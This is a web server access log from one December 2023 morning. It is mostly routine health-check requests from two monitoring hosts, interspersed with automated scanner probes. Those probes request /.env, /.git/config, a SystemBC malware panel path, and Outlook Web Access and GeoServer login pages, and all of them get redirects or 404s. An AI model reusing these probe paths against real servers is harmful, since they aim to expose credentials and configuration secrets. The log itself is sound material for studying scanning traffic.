167.71.120.76 - - [15/Dec/2023:10:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 599 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 600 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 601 "www@docker" "http://172.28.0.10:80" 1ms
185.224.128.191 - - [15/Dec/2023:10:44:57 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 602 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:10:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 603 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 604 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 605 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 606 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 607 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 608 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 609 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 610 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 611 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 612 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 613 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 614 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 615 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 616 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 617 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 618 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 619 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 620 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 621 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 622 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 623 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:10:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 624 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 625 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 626 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 627 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 628 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 629 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 630 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 631 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 632 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 633 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 634 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 635 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 636 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 637 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 638 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 639 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 640 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 641 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 642 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 643 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 644 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:11:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 645 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 646 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 647 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 648 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 649 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 650 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:11:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 651 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:11:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 652 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 653 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 654 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 655 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 656 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 657 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 658 "www@docker" "http://172.28.0.10:80" 0ms
143.110.222.166 - - [15/Dec/2023:11:12:50 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 659 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:11:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 660 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 661 "www@docker" "http://172.28.0.10:80" 0ms
167.94.146.57 - - [15/Dec/2023:11:13:50 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 662 "-" "-" 0ms
167.94.146.57 - - [15/Dec/2023:11:13:55 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 663 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:11:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 664 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 665 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 666 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 667 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 668 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 669 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 670 "www@docker" "http://172.28.0.10:80" 1ms
143.110.222.166 - - [15/Dec/2023:11:17:24 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 671 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:11:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 672 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 673 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 674 "www@docker" "http://172.28.0.10:80" 1ms
45.56.108.128 - - [15/Dec/2023:11:18:58 +0000] "GET /systembc/password.php HTTP/1.0" 404 19 "-" "-" 675 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:11:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 676 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 677 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 678 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 679 "www@docker" "http://172.28.0.10:80" 1ms
54.37.79.75 - - [15/Dec/2023:11:20:50 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 680 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [15/Dec/2023:11:20:50 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 681 "web-to-websecure@internal" "-" 0ms
64.62.197.221 - - [15/Dec/2023:11:20:51 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 682 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:11:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 683 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 684 "www@docker" "http://172.28.0.10:80" 1ms
178.79.177.98 - - [15/Dec/2023:11:22:00 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 685 "web-to-websecure@internal" "-" 0ms
178.79.177.98 - - [15/Dec/2023:11:22:00 +0000] "GET / HTTP/2.0" 404 19 "-" "-" 686 "-" "-" 0ms
167.248.133.34 - - [15/Dec/2023:11:22:09 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 687 "-" "-" 0ms
167.248.133.34 - - [15/Dec/2023:11:22:12 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 688 "-" "-" 0ms
64.62.197.225 - - [15/Dec/2023:11:22:14 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 689 "web-to-websecure@internal" "-" 0ms
64.62.197.213 - - [15/Dec/2023:11:22:14 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 690 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:11:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 691 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 692 "www@docker" "http://172.28.0.10:80" 1ms
64.62.197.220 - - [15/Dec/2023:11:22:50 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 693 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:11:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 694 "www@docker" "http://172.28.0.10:80" 1ms
64.62.197.225 - - [15/Dec/2023:11:23:25 +0000] "GET /geoserver/web/ HTTP/1.1" 301 17 "-" "-" 695 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:11:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 696 "www@docker" "http://172.28.0.10:80" 5ms
159.203.109.206 - - [15/Dec/2023:11:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 697 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 698 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 699 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 700 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 701 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 702 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:11:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 703 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 704 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 705 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 706 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 707 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 708 "www@docker" "http://172.28.0.10:80" 1ms
45.56.108.128 - - [15/Dec/2023:11:30:19 +0000] "GET /systembc/password.php HTTP/1.0" 404 19 "-" "-" 709 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:11:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 710 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 711 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 712 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 713 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 714 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 715 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 716 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 717 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 718 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 719 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 720 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 721 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 722 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 723 "www@docker" "http://172.28.0.10:80" 1ms
179.43.158.242 - - [15/Dec/2023:11:37:12 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 724 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:11:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 725 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 726 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 727 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 728 "www@docker" "http://172.28.0.10:80" 1ms
54.152.1.55 - - [15/Dec/2023:11:38:52 +0000] "GET /.git/config HTTP/1.1" 404 19 "-" "-" 729 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:11:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 730 "www@docker" "http://172.28.0.10:80" 1ms
91.92.243.232 - - [15/Dec/2023:11:39:26 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 731 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:11:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 732 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 733 "www@docker" "http://172.28.0.10:80" 2ms
167.71.120.76 - - [15/Dec/2023:11:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 734 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 735 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 736 "www@docker" "http://172.28.0.10:80" 1ms
64.23.136.190 - - [15/Dec/2023:11:42:03 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 737 "web-to-websecure@internal" "-" 0ms
64.23.136.190 - - [15/Dec/2023:11:42:04 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 738 "-" "-" 0ms
64.23.136.190 - - [15/Dec/2023:11:42:04 +0000] "GET /systembc/password.php HTTP/1.1" 301 17 "-" "-" 739 "web-to-websecure@internal" "-" 0ms
64.23.136.190 - - [15/Dec/2023:11:42:04 +0000] "GET /systembc/password.php HTTP/1.1" 404 19 "-" "-" 740 "-" "-" 0ms
64.23.136.190 - - [15/Dec/2023:11:42:04 +0000] "GET /Ep1v HTTP/1.1" 301 17 "-" "-" 741 "web-to-websecure@internal" "-" 0ms
64.23.136.190 - - [15/Dec/2023:11:42:04 +0000] "GET /Ep1v HTTP/1.1" 404 19 "-" "-" 742 "-" "-" 0ms
64.23.136.190 - - [15/Dec/2023:11:42:05 +0000] "GET /GWqN HTTP/1.1" 301 17 "-" "-" 743 "web-to-websecure@internal" "-" 0ms
64.23.136.190 - - [15/Dec/2023:11:42:05 +0000] "GET /GWqN HTTP/1.1" 404 19 "-" "-" 744 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:11:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 745 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 746 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 747 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 748 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 749 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 750 "www@docker" "http://172.28.0.10:80" 1ms
198.199.94.11 - - [15/Dec/2023:11:45:16 +0000] "GET /owa/auth/logon.aspx HTTP/1.1" 404 19 "-" "-" 751 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:11:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 752 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 753 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:11:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 754 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 755 "www@docker" "http://172.28.0.10:80" 1ms
95.214.235.169 - - [15/Dec/2023:11:46:48 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 756 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [15/Dec/2023:11:46:49 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 757 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:11:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 758 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 759 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 760 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 761 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:11:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 762 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 763 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 764 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 765 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 766 "www@docker" "http://172.28.0.10:80" 1ms
57.129.23.166 - - [15/Dec/2023:11:51:24 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 767 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [15/Dec/2023:11:51:24 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 768 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:11:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 769 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 770 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:11:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 771 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 772 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:11:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 773 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:11:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 774 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 775 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 776 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 777 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 778 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 779 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 780 "www@docker" "http://172.28.0.10:80" 1ms
143.110.222.166 - - [15/Dec/2023:11:57:37 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 781 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:11:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 782 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 783 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:11:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 784 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:11:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 785 "www@docker" "http://172.28.0.10:80" 1ms
